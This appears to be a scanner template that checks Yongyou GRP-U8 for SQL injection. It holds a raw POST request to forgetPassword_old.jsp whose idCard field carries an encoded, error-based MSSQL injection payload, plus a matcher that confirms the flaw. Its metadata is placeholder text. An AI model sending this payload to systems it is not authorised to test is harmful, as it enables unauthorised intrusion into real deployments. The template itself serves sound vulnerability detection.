id: yongyou-GRPU8-SQLinjection

info:
  name: yongyou-GRPU8-SQLinjection
  author: bug
  severity: high
  description: description
  reference:
    - https://
  tags: tags

requests:
  - raw:
      - |
        POST /u8qx/forgetPassword_old.jsp?action=save HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
        Content-Length: 368
        Accept-Encoding: gzip, deflate
        Connection: close
        Content-Type: application/x-www-form-urlencoded

        idCard=1%27%20AND%207155%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28113%29%2B%28SELECT%20SUBSTRING%28%28ISNULL%28CAST%28112%2A111%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%29%2C1%2C1024%29%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%2898%29%2BCHAR%28113%29%2BCHAR%28113%29%29%29--%20BEmg&inputDW=222&userName=1111

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - contains(body,'12432') && status_code==500

